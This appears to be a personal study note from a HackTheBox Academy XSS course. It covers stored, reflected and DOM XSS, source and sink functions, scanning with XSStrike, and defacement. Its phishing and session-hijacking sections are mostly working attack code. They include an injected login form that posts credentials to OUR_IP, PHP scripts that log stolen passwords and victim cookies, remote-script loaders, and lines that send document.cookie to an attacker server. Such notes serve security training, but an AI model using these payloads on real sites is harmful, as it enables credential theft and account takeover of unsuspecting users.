# Cross-Site Scripting (XSS)

## 1.Stored XSS

```html
<script>alert(window.origin)</script>
```

## 2.Reflected XSS

```
<script>alert(window.origin)</script>
```

## 3.DOM XSS

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FklRuFQB6T8UECRAJJyK5%2Fimage.png?alt=media&amp;token=68b88571-2d4e-4b1e-a833-da882e407d67" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FKtXg654XQoVVrGSiDwzB%2Fimage.png?alt=media&amp;token=45cddcff-6da3-4f2f-8d2a-0dbbe4c668c7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUsnWEQkGhVXJhRL5FtUV%2Fimage.png?alt=media&amp;token=4c000f33-555e-466b-8be1-a4e8886e62f2" alt=""><figcaption></figcaption></figure>

### Source & Sink

To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the `Source` and `Sink` of the object displayed on the page. The `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

On the other hand, the `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:

* `document.write()`
* `DOM.innerHTML`
* `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:

* `add()`
* `after()`
* `append()`

If a `Sink` function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.

## DOM Attacks

```html
<img src="" onerror=alert(window.origin)>
```

## 4.XSS Discovery

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try `XSS Strike` by cloning it to our VM with `git clone`:

```shell-session
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

```shell-session
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

### Manual Discovery

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md>" %}

{% embed url="<https://github.com/payloadbox/xss-payload-list>" %}

## 5.Defacing

> Four HTML elements are usually utilized to change the main look of a web page:
>
> * Background Color `document.body.style.background`
> * Background `document.body.background`
> * Page Title `document.title`
> * Page Text `DOM.innerHTML`

### Changing Background

```html
<script>document.body.style.background = "#141d2b"</script>
```

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

### Changing Page Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

### Changing Page Text

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

```javascript
$("#todo").html('New Text');
```

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## 6.Phishing

## Login Form Injection

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

In the above HTML code, `OUR_IP` is the IP of our VM, which we can find with the (`ip a`) command under `tun0`.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Ft2iLSuc2wRXohtM2DEM9%2Fimage.png?alt=media&amp;token=33e891eb-c54b-48bd-9bfc-4123937e89b1" alt=""><figcaption></figcaption></figure>

```
sudo nc -lvnp 80
```

### Credential Stealing

The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php`

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```shell-session
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

## 7.Session Hijacking

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrDu3QEvTPxIWKHwJcZ1b%2Fimage.png?alt=media&amp;token=a2f9a0da-5921-4d87-ba0e-4ee2872638fa" alt=""><figcaption></figcaption></figure>

### Loading a Remote Script

```html
<script src="http://OUR_IP/script.js"></script>
```

We can change the requested script name from `script.js`

```html
<script src="http://OUR_IP/username"></script>
```

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss>" %}

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

```shell-session
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Session Hijacking

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc>

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

```html
<script src=http://OUR_IP/script.js></script>
```

> With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
>
> We can save the following PHP script as `index.php`, and re-run the PHP server again:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

```shell-session
cat cookies.txt 
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FTXxTuMUooKZyIJumLauD%2Fimage.png?alt=media&amp;token=a6470678-d7d9-4386-bd5d-9d07d204478f" alt=""><figcaption></figcaption></figure>
